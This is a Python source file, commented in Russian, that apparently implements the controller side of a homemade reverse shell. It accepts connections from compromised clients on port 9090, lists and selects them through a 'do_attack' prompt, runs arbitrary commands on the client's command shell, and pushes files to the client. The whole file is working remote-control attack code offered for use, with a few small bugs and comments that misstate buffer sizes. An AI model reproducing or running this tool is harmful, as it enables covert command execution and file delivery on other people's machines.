import socket
import datetime
import time
import os
import threading

all_conntections = list()
all_adresses = list()

def refresh():
    """
    Чистим старые соединения и адресса при каждом новом запуске скрипта на сервере.
    """
    for i in all_conntections:
        i.close
    del all_conntections[:]
    del all_adresses[:]

def accept_connections():
    """
    Является первым тредом который работает в фоне, принимает коннекты и распихивает их по спискам.
    """
    print("SockServerV2 is started")

    refresh()

    sock = socket.socket()
    sock.bind(('', 9090))
    sock.listen(5)

    while True:
        conn, addr = sock.accept()
        print("\nНовое соединение: ", addr[0], ", порт: ", addr[1])

        conn.setblocking(1) #я не знаю что оно делает, вроде убирает таймаут, поэксперементировать

        all_conntections.append(conn)
        all_adresses.append(addr)
        print("Соединение было добавлено")


def list_connections():
    """
    Является одной из команд нашего самописаного shell, который резуализуется в do_attack()
    Возвращает список проверенных коннектов (отсеивает отключенные, недоступные)
    """
    result = list()
    #на этом этапе мы можем просто вернуть all_conntections, но хорошо бы сделать проверку
    #enumerate возвращает кортеж из порядкового номера и самого объекта, используется для чистоты кода, не плодить счестчики
    for i, conn in enumerate(all_conntections):
        try:
            #для проверки пробуем что то послать по коннекту и получить обратно
            conn.send(b" ")
            conn.recv(1024)
        except Exception as e:
            print("Conn больше недоступен: ", all_adresses[i], " .Ошибка: ", str(e))
            #если была ошибка то удаляем коннтект с текущим индексом
            del all_conntections[i]
            del all_adresses[i]
            continue #перескакивам на начало цикла и не проваливаемся ниже по коду
        result.append(i)
        print("Доступный адрес: ", all_adresses[i][0], " номер ", i, " порт ", all_adresses[i][1])
    return result


def get_target(cmd):
    """
    Является второй командой нашего самописного shell, который реализуется в do_attack().
    Чистит команду от "select " и возвращает либо объект коннекта из списка рабочих коннектов, либо None.
    """
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        print("Коннект выбран успешно: ", all_adresses[target][0])
        return all_conntections[target]
    except Exception as e:
        print("При выборе коннекта произошла ошибка: ", str(e))
        return None


def reversed_shell(conn):
    """
    Когда коннект выбран мы проваливаеся в луп c Reversed shell, где бесконечно выполняем и получаем результат команд со
    стороны клиента, выход происходит по слову quit.
    """
    try:
        while True:
            cmd = input("Команда для Reversed shell: ")
            if cmd == "quit":
                #наверное не стоит закрывать коннект поэтому след 2 строки закомменчены
                #conn.send(cmd.encode())
                #conn.close()
                break
            if "send" in cmd:
                command, file_name = cmd.split(" ")
                conn.send((f"send {file_name}").encode()) #подгатавливаем клиента к приему

                op = open(file_name, 'rb')
                data = op.read(1024000000) #читаем 10000 кб
                conn.send(data) #100 кб шлем разом одним пакетом

                print(f"Файл {file_name} был успешно отправлен")
                """
                Важная заметка: обычно передача файлов проходит килобайтами, но при резализации такой схемы я столкнулся с тем
                что передача и получение не синхронизируются, сервер сразу вываливает все файлы, клиент не успевает сохранить первый пакет,
                когда уже был послан следующий/последний и программа на стороне клиента виснет. Поэтому было принято решение слать все данные
                разом. При необходимости расширить размер отправляемого пакета. 102400 это вроде всего лишь 100 кб.
                Старый код:
                while True:
                    data = op.read(1024)
                    print(data, " data")
                    if not data:
                        break
                    conn.send(data)
                """
            else:
                #проваливаемся сюда когда шлемкоманды именно для CMD на стороне клиента
                conn.send(cmd.encode())
                data = conn.recv(1024)
                print(data.decode("cp866"))
    except Exception as e:
        print("Коннект утерян с ошибкой: ", str(e))

def do_attack():
    """
    Является вторым тредом который работает в фоне и реализует функционал с доступными коннектами через самописный prompt.
    """
    while True:
        cmd = input("Команда для Prompt:")
        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                reversed_shell(conn)
        else:
            print("Команда не распознана")

if __name__ == '__main__':
    """
    Старт программы. Треды были реализованы классическим образом, хотя у автора была реализация через очереди (queue)
    """
    threadOne = threading.Thread(target=accept_connections, name="start handling connections")
    threadTwo = threading.Thread(target=do_attack, name="choose connection and start reversed shell")
    threadOne.start()
    threadTwo.start()
    threadOne.join()
    threadTwo.join()

"""
                while True:
                    data = op.read(1024)
                    print(data, " data")
                    if not data:
                        break
                    conn.send(data)
"""